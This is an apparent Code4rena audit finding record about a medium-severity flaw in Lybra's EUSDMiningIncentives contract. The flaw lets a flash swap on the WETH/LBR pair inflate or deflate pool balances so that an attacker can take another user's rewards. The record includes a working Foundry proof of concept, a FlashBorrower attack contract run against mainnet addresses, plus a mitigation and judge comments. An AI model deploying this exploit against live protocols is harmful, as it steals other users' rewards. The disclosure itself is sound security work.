{
  "Title": "[M-13] It is possible to manipulate WETH/LBR pair to claim reward of the users which shouldn't be claimed",
  "Content": "\nMalicious user can manipulate balances of the WETH/LBR pair and bypass this check:\n\n<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L203>\n\nWhich allows them to steal rewards from a user who has staked enough LP and whose rewards shouldn't be claimable under normal circumstances.\n\n`EUSDMiningIncentives.sol` is a staking contract which distributes rewards to users based on how much EUSD they have minted/borrowed. Rewards are accumulated over time and can be claimed only if a user has staked enough WETH/LBR uniswap pair LP tokens into another staking:\n\n<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/stakerewardV2pool.sol>\n\nThis condition is checked here:\n\n<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L188>\n\nAs we can see, `stakedLBRLpValue` of a user is calculated based on how much LP they have staked and the total cost of the tokens that are stored inside the WETH/LBR pair.\n\n<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L151-L156>\n\nThe total cost, however, is simply derived from the sum of the tokens balances, which we get with `balanceOf(pair)`.\n\nThis can be exploited:\n\n1.  Alice minted some EUSD tokens.\n2.  They also have staked LP tokens in the staking rewards contract.\n3.  Currently `isOtherEarningsClaimable(alice)` returns false, that means they are safe.\n4.  Bob wants to take Alice's rewards for themselves.\n5.  They call a direct swap with WETH/LBR pair and chooses amounts that will lower the total cost of the LP.\n\n        lbrInLp + etherInLp\n\n6.  Then inside the callback Bob calls `purchaseOtherEarnings` and takes Alice's rewards.\n7.  After that, Bob repays the loan.\n\n### Proof of Concept\n\nCustom test:\n<details>\n\n\n    // SPDX-License-Identifier: AGPL-3.0-only\n    pragma solidity ^0.8.17;\n\n    import {DSTestPlus} from \"solmate/test/utils/DSTestPlus.sol\";\n    import {LybraStETHDepositVault as Vault} from \"../contracts/lybra/pools/LybraStETHVault.sol\";\n    import {PeUSDMainnet as PeUSD} from \"../contracts/lybra/token/PeUSDMainnetStableVision.sol\";\n    import {EUSD, IERC20} from \"../contracts/lybra/token/EUSD.sol\";\n    import {Configurator} from \"../contracts/lybra/configuration/LybraConfigurator.sol\";\n    import {EUSDMiningIncentives as Miner} from \"../contracts/lybra/miner/EUSDMiningIncentives.sol\";\n    import {StakingRewardsV2} from \"../contracts/lybra/miner/stakerewardV2pool.sol\";\n    import {esLBRBoost as Boost} from \"../contracts/lybra/miner/esLBRBoost.sol\";\n    import {stETHMock} from \"../contracts/mocks/stETHMock.sol\";\n    import {WstETH, IStETH} from \"../contracts/mocks/mockWstETH.sol\";\n    import {mockCurve} from \"../contracts/mocks/mockCurve.sol\";\n    import {mockEtherPriceOracle} from \"../contracts/mocks/mockEtherPriceOracle.sol\";\n    import {mockLBRPriceOracle} from \"../contracts/mocks/mockLBRPriceOracle.sol\";\n\n    import \"forge-std/console.sol\";\n    import \"forge-std/Test.sol\";\n    import \"./FlashBorrower.sol\";\n\n    contract DAO {\n        function checkRole(bytes32, address) external pure returns(bool) {\n            return true;\n        } \n        function checkOnlyRole(bytes32, address) external pure returns(bool) {\n            return true;\n        } \n    }\n\n    contract Oracle {\n        uint256 price;\n\n        function setPrice(uint256 _price) external {\n            price = _price;\n        } \n\n        function fetchPrice() external view returns(uint256) {\n            return price;\n        } \n    }\n\n    contract ESLBRMock {\n        function mint(address, uint256) external returns(bool){\n            return true;\n        }\n        function burn(address, uint256) external returns(bool){\n            return true;\n        }\n    }\n\n    contract LybraEUSDPoolTest is Test{\n        Vault vault;\n        PeUSD peusd;\n        EUSD eusd;\n        Configurator config;\n        Boost boost;\n        Miner miner;\n        StakingRewardsV2 stakingReward;\n        stETHMock stETH;\n        WstETH wstETH;\n        ESLBRMock eslbr;\n        mockCurve curve;\n        Oracle oracle;\n        DAO dao;\n        mockEtherPriceOracle ethOracle;\n        mockLBRPriceOracle lbrOracle;\n        address[] pools;\n\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        IV2Router router;\n        IV2Pair v2Pair; // WETH/LBR\n        IWETH WETH;\n        IERC20 LBR;\n\n        function setUp() public {\n            vm.createSelectFork(vm.envString(\"RPC_MAINNET_URL\"), 17592869);\n            router = IV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n            v2Pair = IV2Pair(0x061883CD8a060eF5B8d83cDe362C3Fdbd8162EeE);\n            WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n            LBR = IERC20(0xF1182229B71E79E504b1d2bF076C15a277311e05);\n\n            stETH = new stETHMock();\n            wstETH = new WstETH(IStETH(address(stETH)));\n            eslbr = new ESLBRMock();\n            curve = new mockCurve();\n            oracle = new Oracle();\n            ethOracle = new mockEtherPriceOracle();\n            lbrOracle = new mockLBRPriceOracle();\n            dao = new DAO();\n            config = new Configurator(address(dao), address(curve));\n            eusd = new EUSD(address(config));\n            peusd = new PeUSD(address(config), 18, makeAddr(\"LZ\"));\n            config.initToken(address(eusd), address(peusd));\n            vault = new Vault(address(config), address(stETH), address(oracle));\n            \n            pools.push(address(vault));\n            config.setMintVault(address(vault), true);\n            oracle.setPrice(1800 * 1e18);\n\n            boost = new Boost();\n            miner = new Miner(address(config), address(boost), address(ethOracle), address(lbrOracle)); \n            stakingReward = new StakingRewardsV2(address(v2Pair), address(eslbr), address(boost));\n            miner.setEthlbrStakeInfo(address(stakingReward), address(v2Pair));\n            miner.setPools(pools);\n            miner.setToken(address(LBR), address(eslbr));\n\n            config.setMintVaultMaxSupply(address(vault), 10_000_000 * 1e18);\n            config.setSafeCollateralRatio(address(vault), 160 * 1e18);\n            config.setBadCollateralRatio(address(vault), 150 * 1e18);\n            config.setEUSDMiningIncentives(address(miner));\n            stETH.approve(address(vault), ~uint256(0));\n            vm.deal(alice, 10 ether);\n            stETH.transfer(alice, 500 ether);\n        }\n\n        function swapAndLiquify(address who, uint256 amount, address[] memory path) internal {\n            // get WETH and LBR, purchase and stake LP tokens\n            vm.startPrank(who);\n            WETH.deposit{value: amount}();\n            WETH.approve(address(router), ~uint256(0));\n            LBR.approve(address(router), ~uint256(0));\n            v2Pair.approve(address(stakingReward), ~uint256(0));\n            router.swapExactTokensForTokens(amount/2, 0, path, who, block.timestamp);\n            router.addLiquidity(address(WETH), address(LBR), amount/2, (amount * 1000)/2, 1, 1, who, block.timestamp);\n            console.log(v2Pair.balanceOf(who));\n            stakingReward.stake(v2Pair.balanceOf(who));\n            vm.stopPrank();\n        }\n\n        function testFlashLoanAttack() public {\n            uint256 mintAmount = 1800*60*1e18;\n\n            address[] memory path = new address[](2);\n            path[0] = address(WETH);\n            path[1] = address(LBR);\n            \n            // PREP THE ATTACK\n            // Alice has borrowed 540_000 EUSD and staked 126 LP tokens \n            vault.depositAssetToMint(100*1e18, mintAmount);\n            swapAndLiquify(address(this), 0.8 ether, path);\n            vm.startPrank(alice);\n            stETH.approve(address(vault), ~uint256(0));\n            vault.depositAssetToMint(500*1e18, mintAmount * 5);\n            vm.stopPrank();\n            swapAndLiquify(alice, 10 ether, path);\n\n            assertEq(miner.isOtherEarningsClaimable(address(this)), true);\n            assertEq(miner.isOtherEarningsClaimable(alice), false);\n            \n            // COMMENCE THE ATTACK\n            FlashBorrower flashBorrower = new FlashBorrower(WETH, LBR, miner, stakingReward, v2Pair, router, alice);         \n            WETH.approve(address(flashBorrower), ~uint256(0));\n            LBR.approve(address(flashBorrower), ~uint256(0));\n            // Get some tokens to repay flash swap fees\n            WETH.deposit{value: 6 ether}();\n            \n            router.swapExactTokensForTokens(3 ether, 0, path, address(this), block.timestamp);\n            WETH.transfer(address(flashBorrower), 1000);\n            LBR.transfer(address(flashBorrower), 1000);\n            // Drain tokens from the pair and manipulate {stakedLBRLpValue} to pass this check and claim rewards from the target\n            // https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L193\n            flashBorrower.flash(800 ether, 800000 ether);\n        }\n    }\n\n`FlashBorrower` contract, notice the require check where we check if target user reward is claimable:\n\n    // SPDX-License-Identifier: AGPL-3.0-only\n    pragma solidity ^0.8.17;\n\n    import {EUSDMiningIncentives as Miner} from \"../contracts/lybra/miner/EUSDMiningIncentives.sol\";\n    import {StakingRewardsV2} from \"../contracts/lybra/miner/stakerewardV2pool.sol\";\n    import {IERC20} from \"../contracts/lybra/token/EUSD.sol\";\n\n    import \"forge-std/console.sol\";\n\n    interface IV2Pair is IERC20 {\n        function factory() external view returns(address);\n        function swap(\n            uint amount0Out,\n            uint amount1Out,\n            address to,\n            bytes calldata data\n        ) external;\n    }\n\n    interface IV2Router {\n        function factory() external view returns(address);\n        function swapExactTokensForTokens(\n            uint amountIn,\n            uint amountOutMin,\n            address[] calldata path,\n            address to,\n            uint deadline\n        ) external returns (uint[] memory amounts);\n        function addLiquidity(\n            address tokenA,\n            address tokenB,\n            uint amountADesired,\n            uint amountBDesired,\n            uint amountAMin,\n            uint amountBMin,\n            address to,\n            uint deadline\n        ) external returns (uint amountA, uint amountB, uint liquidity);\n        function removeLiquidity(\n            address tokenA,\n            address tokenB,\n            uint liquidity,\n            uint amountAMin,\n            uint amountBMin,\n            address to,\n            uint deadline\n        ) external returns (uint amountA, uint amountB);\n    }\n\n    interface IWETH is IERC20 {\n        function deposit() external payable;\n        function withdraw(uint amount) external;\n    }\n\n    contract FlashBorrower {\n        IWETH token0;\n        IERC20 token1;\n        Miner miner;\n        StakingRewardsV2 staking;\n        IV2Pair v2Pair;\n        IV2Router v2Router;\n        address target;\n\n        constructor(\n            IWETH _token0,\n            IERC20 _token1,\n            Miner _miner,\n            StakingRewardsV2 _staking,\n            IV2Pair _v2Pair,\n            IV2Router _v2Router,\n            address _target\n        ) {\n            token0 = _token0;\n            token1 = _token1;\n            miner = _miner;\n            staking = _staking;\n            v2Pair = _v2Pair;\n            v2Router = _v2Router;\n            target = _target;\n            token0.approve(address(v2Router), ~uint256(0));\n            token1.approve(address(v2Router), ~uint256(0));\n            v2Pair.approve(address(v2Router), ~uint256(0));\n        }\n\n        function uniswapV2Call(\n            address sender,\n            uint256 amount0,\n            uint256 amount1,\n            bytes calldata data\n        ) external {\n            address caller = abi.decode(data, (address));\n\n            require(miner.isOtherEarningsClaimable(target), \"CAN'T GRAB TARGET'S REWARD\");\n\n            // Repay borrow\n            uint256 fee0 = (amount0 * 3) / 997 + 1;\n            uint256 fee1 = (amount1 * 3) / 997 + 1;\n            uint256 amountToRepay0 = amount0 + fee0;\n            uint256 amountToRepay1 = amount1 + fee1;\n\n            // Transfer flash swap fee from caller\n            token0.transferFrom(caller, address(this), fee0);\n            token1.transferFrom(caller, address(this), fee1);\n\n            // Repay\n            token0.transfer(address(v2Pair), amountToRepay0);\n            token1.transfer(address(v2Pair), amountToRepay1);\n        }\n\n        function flash(uint256 amount0, uint256 amount1) public {\n            bytes memory data = abi.encode(msg.sender);\n            v2Pair.swap(amount0, amount1, address(this), data);\n        }\n    }\n\n</details>\n\n### Tools Used\nForge. I forked the ETH mainnet at block `17592869`. Also, the following mainnet contracts were used:\n- Uniswap V2 router (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),\n- WETH/LBR uniswap pair (0x061883CD8a060eF5B8d83cDe362C3Fdbd8162EeE),\n- WETH token (0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),\n- LBR token (0xF1182229B71E79E504b1d2bF076C15a277311e05)\n\n### Recommended Mitigation Steps\n\nUse `ethlbrLpToken.getReserves()` instead of quoting balances directly with `balanceOf`\n\n    (uint112 r0, uint112 r1, ) = ethlbrLpToken.getReserves()\n    uint256 etherInLp = (r0 * uint(etherPrice)) / 1e8;\n    uint256 lbrInLp = (r1 * uint(lbrPrice)) / 1e8;\n\n### Assessed type\n\nUniswap\n\n**[LybraFinance disputed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/442#issuecomment-1635587856):**\n > The real price will be obtained through `Chainlink` oracles instead of the exchange rate in the LP. It will not be manipulated by flash loans.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/442#issuecomment-1650718199):**\n > @LybraFinance - I think this qualifies as M. Are you suggesting that in the future the price will be pulled from `Chainlink`? If so, the wardens are reviewing the code base as written, not future changes to include a different price discovery mechanism and therefore I think this is valid. \n\n**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/442#issuecomment-1653123691)**\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-06-lybra",
  "Code": [
    {
      "filename": "contracts/lybra/miner/EUSDMiningIncentives.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.17;\n/**\n * @title tokenMiner is a stripped down version of Synthetix StakingRewards.sol, to reward esLBR to EUSD minters.\n * Differences from the original contract,\n * - Get `totalStaked` from totalSupply() in contract EUSD.\n * - Get `stakedOf(user)` from getBorrowedOf(user) in contract EUSD.\n * - When an address borrowed EUSD amount changes, call the refreshReward method to update rewards to be claimed.\n */\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"../interfaces/IesLBR.sol\";\nimport \"../interfaces/IEUSD.sol\";\nimport \"../interfaces/ILybra.sol\";\nimport \"../interfaces/Iconfigurator.sol\";\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ninterface IesLBRBoost {\n    function getUserBoost(\n        address user,\n        uint256 userUpdatedAt,\n        uint256 finishAt\n    ) external view returns (uint256);\n}\n\ncontract EUSDMiningIncentives is Ownable {\n    Iconfigurator public immutable configurator;\n    IesLBRBoost public esLBRBoost;\n    IEUSD public immutable EUSD;\n    address public esLBR;\n    address public LBR;\n    address[] public pools;\n\n    // Duration of rewards to be paid out (in seconds)\n    uint256 public duration = 2_592_000;\n    // Timestamp of when the rewards finish\n    uint256 public finishAt;\n    // Minimum of last updated time and reward finish time\n    uint256 public updatedAt;\n    // Reward to be paid out per second\n    uint256 public rewardRatio;\n    // Sum of (reward ratio * dt * 1e18 / total supply)\n    uint256 public rewardPerTokenStored;\n    // User address => rewardPerTokenStored\n    mapping(address => uint256) public userRewardPerTokenPaid;\n    // User address => rewards to be claimed\n    mapping(address => uint256) public rewards;\n    mapping(address => uint256) public userUpdatedAt;\n    uint256 public extraRatio = 50 * 1e18;\n    uint256 public peUSDExtraRatio = 10 * 1e18;\n    uint256 public biddingFeeRatio = 3000;\n    address public ethlbrStakePool;\n    address public ethlbrLpToken;\n    AggregatorV3Interface internal etherPriceFeed;\n    AggregatorV3Interface internal lbrPriceFeed;\n    bool public isEUSDBuyoutAllowed = true;\n\n    event ClaimReward(address indexed user, uint256 amount, uint256 time);\n    event ClaimedOtherEarnings(address indexed user, address indexed Victim, uint256 buyAmount, uint256 biddingFee, bool useEUSD, uint256 time);\n    event NotifyRewardChanged(uint256 addAmount, uint256 time);\n\n    //etherOracle = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n    constructor(address _config, address _boost, address _etherOracle, address _lbrOracle) {\n        configurator = Iconfigurator(_config);\n        esLBRBoost = IesLBRBoost(_boost);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherPriceFeed = AggregatorV3Interface(_etherOracle);\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    modifier updateReward(address _account) {\n        rewardPerTokenStored = rewardPerToken();\n        updatedAt = lastTimeRewardApplicable();\n\n        if (_account != address(0)) {\n            rewards[_account] = earned(_account);\n            userRewardPerTokenPaid[_account] = rewardPerTokenStored;\n            userUpdatedAt[_account] = block.timestamp;\n        }\n        _;\n    }\n\n    function setToken(address _lbr, address _eslbr) external onlyOwner {\n        LBR = _lbr;\n        esLBR = _eslbr;\n    }\n\n    function setLBROracle(address _lbrOracle) external onlyOwner {\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    function setPools(address[] memory _pools) external onlyOwner {\n        for (uint i = 0; i < _pools.length; i++) {\n            require(configurator.mintVault(_pools[i]), \"NOT_VAULT\");\n        }\n        pools = _pools;\n    }\n\n    function setBiddingCost(uint256 _biddingRatio) external onlyOwner {\n        require(_biddingRatio <= 8000, \"BCE\");\n        biddingFeeRatio = _biddingRatio;\n    }\n\n    function setExtraRatio(uint256 ratio) external onlyOwner {\n        require(ratio <= 1e20, \"BCE\");\n        extraRatio = ratio;\n    }\n\n    function setPeUSDExtraRatio(uint256 ratio) external onlyOwner {\n        require(ratio <= 1e20, \"BCE\");\n        peUSDExtraRatio = ratio;\n    }\n\n    function setBoost(address _boost) external onlyOwner {\n        esLBRBoost = IesLBRBoost(_boost);\n    }\n\n    function setRewardsDuration(uint256 _duration) external onlyOwner {\n        require(finishAt < block.timestamp, \"reward duration not finished\");\n        duration = _duration;\n    }\n\n    function setEthlbrStakeInfo(address _pool, address _lp) external onlyOwner {\n        ethlbrStakePool = _pool;\n        ethlbrLpToken = _lp;\n    }\n    function setEUSDBuyoutAllowed(bool _bool) external onlyOwner {\n        isEUSDBuyoutAllowed = _bool;\n    }\n\n    function totalStaked() internal view returns (uint256) {\n        return EUSD.totalSupply();\n    }\n\n    function stakedOf(address user) public view returns (uint256) {\n        uint256 amount;\n        for (uint i = 0; i < pools.length; i++) {\n            ILybra pool = ILybra(pools[i]);\n            uint borrowed = pool.getBorrowedOf(user);\n            if (pool.getVaultType() == 1) {\n                borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20;\n            }\n            amount += borrowed;\n        }\n        return amount;\n    }\n\n    function stakedLBRLpValue(address user) public view returns (uint256) {\n        uint256 totalLp = IEUSD(ethlbrLpToken).totalSupply();\n        (, int etherPrice, , , ) = etherPriceFeed.latestRoundData();\n        (, int lbrPrice, , , ) = lbrPriceFeed.latestRoundData();\n        uint256 etherInLp = (IEUSD(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(ethlbrLpToken) * uint(etherPrice)) / 1e8;\n        uint256 lbrInLp = (IEUSD(LBR).balanceOf(ethlbrLpToken) * uint(lbrPrice)) / 1e8;\n        uint256 userStaked = IEUSD(ethlbrStakePool).balanceOf(user);\n        return (userStaked * (lbrInLp + etherInLp)) / totalLp;\n    }\n\n    function lastTimeRewardApplicable() public view returns (uint256) {\n        return _min(finishAt, block.timestamp);\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalStaked() == 0) {\n            return rewardPerTokenStored;\n        }\n\n        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked();\n    }\n\n    /**\n     * @notice Update user's claimable reward data and record the timestamp.\n     */\n    function refreshReward(address _account) external updateReward(_account) {}\n\n    function getBoost(address _account) public view returns (uint256) {\n        uint256 redemptionBoost;\n        if (configurator.isRedemptionProvider(_account)) {\n            redemptionBoost = extraRatio;\n        }\n        return 100 * 1e18 + redemptionBoost + esLBRBoost.getUserBoost(_account, userUpdatedAt[_account], finishAt);\n    }\n\n    function earned(address _account) public view returns (uint256) {\n        return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];\n    }\n\n    function isOtherEarningsClaimable(address user) public view returns (bool) {\n        return (stakedLBRLpValue(user) * 10000) / stakedOf(user) < 500;\n    }\n\n    function getReward() external updateReward(msg.sender) {\n        require(!isOtherEarningsClaimable(msg.sender), \"Insufficient DLP, unable to claim rewards\");\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            IesLBR(esLBR).mint(msg.sender, reward);\n            emit ClaimReward(msg.sender, reward, block.timestamp);\n        }\n    }\n\n    function purchaseOtherEarnings(address user, bool useEUSD) external updateReward(user) {\n        require(isOtherEarningsClaimable(user), \"The rewards of the user cannot be bought out\");\n        if(useEUSD) {\n            require(isEUSDBuyoutAllowed, \"The purchase using EUSD is not permitted.\");\n        }\n        uint256 reward = rewards[user];\n        if (reward > 0) {\n            rewards[user] = 0;\n            uint256 biddingFee = (reward * biddingFeeRatio) / 10000;\n            if(useEUSD) {\n                (, int lbrPrice, , , ) = lbrPriceFeed.latestRoundData();\n                biddingFee = biddingFee * uint256(lbrPrice) / 1e8;\n                bool success = EUSD.transferFrom(msg.sender, address(configurator), biddingFee);\n                require(success, \"TF\");\n                try configurator.distributeRewards() {} catch {}\n            } else {\n                IesLBR(LBR).burn(msg.sender, biddingFee);\n            }\n            IesLBR(esLBR).mint(msg.sender, reward);\n\n            emit ClaimedOtherEarnings(msg.sender, user, reward, biddingFee, useEUSD, block.timestamp);\n        }\n    }\n\n    function notifyRewardAmount(\n        uint256 amount\n    ) external onlyOwner updateReward(address(0)) {\n        require(amount > 0, \"amount = 0\");\n        if (block.timestamp >= finishAt) {\n            rewardRatio = amount / duration;\n        } else {\n            uint256 remainingRewards = (finishAt - block.timestamp) * rewardRatio;\n            rewardRatio = (amount + remainingRewards) / duration;\n        }\n\n        require(rewardRatio > 0, \"reward ratio = 0\");\n\n        finishAt = block.timestamp + duration;\n        updatedAt = block.timestamp;\n        emit NotifyRewardChanged(amount, block.timestamp);\n    }\n\n    function _min(uint256 x, uint256 y) private pure returns (uint256) {\n        return x <= y ? x : y;\n    }\n}"
    },
    {
      "filename": "contracts/lybra/miner/EUSDMiningIncentives.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.17;\n/**\n * @title tokenMiner is a stripped down version of Synthetix StakingRewards.sol, to reward esLBR to EUSD minters.\n * Differences from the original contract,\n * - Get `totalStaked` from totalSupply() in contract EUSD.\n * - Get `stakedOf(user)` from getBorrowedOf(user) in contract EUSD.\n * - When an address borrowed EUSD amount changes, call the refreshReward method to update rewards to be claimed.\n */\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"../interfaces/IesLBR.sol\";\nimport \"../interfaces/IEUSD.sol\";\nimport \"../interfaces/ILybra.sol\";\nimport \"../interfaces/Iconfigurator.sol\";\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ninterface IesLBRBoost {\n    function getUserBoost(\n        address user,\n        uint256 userUpdatedAt,\n        uint256 finishAt\n    ) external view returns (uint256);\n}\n\ncontract EUSDMiningIncentives is Ownable {\n    Iconfigurator public immutable configurator;\n    IesLBRBoost public esLBRBoost;\n    IEUSD public immutable EUSD;\n    address public esLBR;\n    address public LBR;\n    address[] public pools;\n\n    // Duration of rewards to be paid out (in seconds)\n    uint256 public duration = 2_592_000;\n    // Timestamp of when the rewards finish\n    uint256 public finishAt;\n    // Minimum of last updated time and reward finish time\n    uint256 public updatedAt;\n    // Reward to be paid out per second\n    uint256 public rewardRatio;\n    // Sum of (reward ratio * dt * 1e18 / total supply)\n    uint256 public rewardPerTokenStored;\n    // User address => rewardPerTokenStored\n    mapping(address => uint256) public userRewardPerTokenPaid;\n    // User address => rewards to be claimed\n    mapping(address => uint256) public rewards;\n    mapping(address => uint256) public userUpdatedAt;\n    uint256 public extraRatio = 50 * 1e18;\n    uint256 public peUSDExtraRatio = 10 * 1e18;\n    uint256 public biddingFeeRatio = 3000;\n    address public ethlbrStakePool;\n    address public ethlbrLpToken;\n    AggregatorV3Interface internal etherPriceFeed;\n    AggregatorV3Interface internal lbrPriceFeed;\n    bool public isEUSDBuyoutAllowed = true;\n\n    event ClaimReward(address indexed user, uint256 amount, uint256 time);\n    event ClaimedOtherEarnings(address indexed user, address indexed Victim, uint256 buyAmount, uint256 biddingFee, bool useEUSD, uint256 time);\n    event NotifyRewardChanged(uint256 addAmount, uint256 time);\n\n    //etherOracle = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n    constructor(address _config, address _boost, address _etherOracle, address _lbrOracle) {\n        configurator = Iconfigurator(_config);\n        esLBRBoost = IesLBRBoost(_boost);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherPriceFeed = AggregatorV3Interface(_etherOracle);\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    modifier updateReward(address _account) {\n        rewardPerTokenStored = rewardPerToken();\n        updatedAt = lastTimeRewardApplicable();\n\n        if (_account != address(0)) {\n            rewards[_account] = earned(_account);\n            userRewardPerTokenPaid[_account] = rewardPerTokenStored;\n            userUpdatedAt[_account] = block.timestamp;\n        }\n        _;\n    }\n\n    function setToken(address _lbr, address _eslbr) external onlyOwner {\n        LBR = _lbr;\n        esLBR = _eslbr;\n    }\n\n    function setLBROracle(address _lbrOracle) external onlyOwner {\n        lbrPriceFeed = AggregatorV3Interface(_lbrOracle);\n    }\n\n    function setPools(address[] memory _pools) external onlyOwner {\n        for (uint i = 0; i < _pools.length; i++) {\n            require(configurator.mintVault(_pools[i]), \"NOT_VAULT\");\n        }\n        pools = _pools;\n    }\n\n    function setBiddingCost(uint256 _biddingRatio) external onlyOwner {\n        require(_biddingRatio <= 8000, \"BCE\");\n        biddingFeeRatio = _biddingRatio;\n    }\n\n    function setExtraRatio(uint256 ratio) external onlyOwner {\n        require(ratio <= 1e20, \"BCE\");\n        extraRatio = ratio;\n    }\n\n    function setPeUSDExtraRatio(uint256 ratio) external onlyOwner {\n        require(ratio <= 1e20, \"BCE\");\n        peUSDExtraRatio = ratio;\n    }\n\n    function setBoost(address _boost) external onlyOwner {\n        esLBRBoost = IesLBRBoost(_boost);\n    }\n\n    function setRewardsDuration(uint256 _duration) external onlyOwner {\n        require(finishAt < block.timestamp, \"reward duration not finished\");\n        duration = _duration;\n    }\n\n    function setEthlbrStakeInfo(address _pool, address _lp) external onlyOwner {\n        ethlbrStakePool = _pool;\n        ethlbrLpToken = _lp;\n    }\n    function setEUSDBuyoutAllowed(bool _bool) external onlyOwner {\n        isEUSDBuyoutAllowed = _bool;\n    }\n\n    function totalStaked() internal view returns (uint256) {\n        return EUSD.totalSupply();\n    }\n\n    function stakedOf(address user) public view returns (uint256) {\n        uint256 amount;\n        for (uint i = 0; i < pools.length; i++) {\n            ILybra pool = ILybra(pools[i]);\n            uint borrowed = pool.getBorrowedOf(user);\n            if (pool.getVaultType() == 1) {\n                borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20;\n            }\n            amount += borrowed;\n        }\n        return amount;\n    }\n\n    function stakedLBRLpValue(address user) public view returns (uint256) {\n        uint256 totalLp = IEUSD(ethlbrLpToken).totalSupply();\n        (, int etherPrice, , , ) = etherPriceFeed.latestRoundData();\n        (, int lbrPrice, , , ) = lbrPriceFeed.latestRoundData();\n        uint256 etherInLp = (IEUSD(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(ethlbrLpToken) * uint(etherPrice)) / 1e8;\n        uint256 lbrInLp = (IEUSD(LBR).balanceOf(ethlbrLpToken) * uint(lbrPrice)) / 1e8;\n        uint256 userStaked = IEUSD(ethlbrStakePool).balanceOf(user);\n        return (userStaked * (lbrInLp + etherInLp)) / totalLp;\n    }\n\n    function lastTimeRewardApplicable() public view returns (uint256) {\n        return _min(finishAt, block.timestamp);\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalStaked() == 0) {\n            return rewardPerTokenStored;\n        }\n\n        return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked();\n    }\n\n    /**\n     * @notice Update user's claimable reward data and record the timestamp.\n     */\n    function refreshReward(address _account) external updateReward(_account) {}\n\n    function getBoost(address _account) public view returns (uint256) {\n        uint256 redemptionBoost;\n        if (configurator.isRedemptionProvider(_account)) {\n            redemptionBoost = extraRatio;\n        }\n        return 100 * 1e18 + redemptionBoost + esLBRBoost.getUserBoost(_account, userUpdatedAt[_account], finishAt);\n    }\n\n    function earned(address _account) public view returns (uint256) {\n        return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account];\n    }\n\n    function isOtherEarningsClaimable(address user) public view returns (bool) {\n        return (stakedLBRLpValue(user) * 10000) / stakedOf(user) < 500;\n    }\n\n    function getReward() external updateReward(msg.sender) {\n        require(!isOtherEarningsClaimable(msg.sender), \"Insufficient DLP, unable to claim rewards\");\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            IesLBR(esLBR).mint(msg.sender, reward);\n            emit ClaimReward(msg.sender, reward, block.timestamp);\n        }\n    }\n\n    function purchaseOtherEarnings(address user, bool useEUSD) external updateReward(user) {\n        require(isOtherEarningsClaimable(user), \"The rewards of the user cannot be bought out\");\n        if(useEUSD) {\n            require(isEUSDBuyoutAllowed, \"The purchase using EUSD is not permitted.\");\n        }\n        uint256 reward = rewards[user];\n        if (reward > 0) {\n            rewards[user] = 0;\n            uint256 biddingFee = (reward * biddingFeeRatio) / 10000;\n            if(useEUSD) {\n                (, int lbrPrice, , , ) = lbrPriceFeed.latestRoundData();\n                biddingFee = biddingFee * uint256(lbrPrice) / 1e8;\n                bool success = EUSD.transferFrom(msg.sender, address(configurator), biddingFee);\n                require(success, \"TF\");\n                try configurator.distributeRewards() {} catch {}\n            } else {\n                IesLBR(LBR).burn(msg.sender, biddingFee);\n            }\n            IesLBR(esLBR).mint(msg.sender, reward);\n\n            emit ClaimedOtherEarnings(msg.sender, user, reward, biddingFee, useEUSD, block.timestamp);\n        }\n    }\n\n    function notifyRewardAmount(\n        uint256 amount\n    ) external onlyOwner updateReward(address(0)) {\n        require(amount > 0, \"amount = 0\");\n        if (block.timestamp >= finishAt) {\n            rewardRatio = amount / duration;\n        } else {\n            uint256 remainingRewards = (finishAt - block.timestamp) * rewardRatio;\n            rewardRatio = (amount + remainingRewards) / duration;\n        }\n\n        require(rewardRatio > 0, \"reward 